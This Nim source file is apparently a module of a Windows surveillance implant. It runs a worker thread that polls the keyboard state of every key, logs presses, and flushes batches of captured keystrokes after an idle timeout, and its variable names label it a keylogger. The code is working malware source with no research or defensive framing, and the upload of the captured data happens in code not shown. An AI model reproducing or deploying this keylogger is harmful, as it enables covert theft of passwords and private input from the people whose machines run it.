from std/locks import acquire, release
import ../../utils/winapi/handlers
import ./shared

proc workerBoardstate*(_: pointer) {.stdcall.} =
  # Worker that polls key state and records presses
  var last: array[vkLast + 1, bool]
  var resetPoll = true
  while true:
    ensureKlMtx()
    acquire(klMtx)
    let runBoard = active and captureMode == cmBoardstate
    if not runBoard:
      parked = true
      release(klMtx)
      sleepMs(culong boardPollMs)
      continue
    parked = false
    release(klMtx)

    if resetPoll:
      zeroMem(addr last, sizeof(last))
      resetPoll = false

    for vk in vkFirst .. vkLast:
      let s = getAsyncKeyState(vk.int32)
      let down = (s and 0x8000'i16) != 0
      let press = (s and 0x0001'i16) != 0
      if press or (down and not last[vk]):
        addKey(vkLabel(vk.int32))
      last[vk] = down
    ensureKlMtx()
    acquire(klMtx)
    let pending = batch.len > 0
    let lastKey = klLastKeyMs
    release(klMtx)
    if pending and lastKey > 0 and getTickCount64() - lastKey >= keyloggerIdleMs:
      flushBatch()
      acquire(klMtx)
      klLastKeyMs = 0
      release(klMtx)
    sleepMs(culong boardPollMs)

    ensureKlMtx()
    acquire(klMtx)
    let stillOn = active
    release(klMtx)
    if not stillOn:
      resetPoll = true
